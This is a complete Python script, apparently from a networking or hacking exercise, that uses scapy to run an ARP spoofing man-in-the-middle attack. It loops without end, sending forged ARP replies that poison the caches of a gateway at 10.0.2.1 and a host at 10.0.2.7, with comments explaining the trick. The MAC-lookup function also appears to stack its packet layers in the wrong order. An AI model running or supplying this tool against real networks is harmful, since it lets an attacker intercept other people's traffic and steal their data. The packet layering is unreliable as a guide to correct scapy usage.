import time

import scapy.all as scapy


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # default destination Mac for broadcast MAC derived from the ether frame
    arp_request_broadcast = arp_request/broadcast  # appends packets
    answered = scapy.srp(arp_request_broadcast, timeout=1, verbose=True)[0]  # .srp returns 2 lists in form of response from the broadcast
    return answered[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # op = 2 is written for an arp packet to be a response rather than a request, this packet makes client think that we have router's address and router think that we have clients address
    scapy.send(packet, verbose=False)


packet_count = 0
while True:
    spoof("10.0.2.1", "10.0.2.7")
    spoof("10.0.2.7", "10.0.2.1")
    packet_count += 2
    print("\rpackets sent:" + str(packet_count), end="")
    time.sleep(1.5)
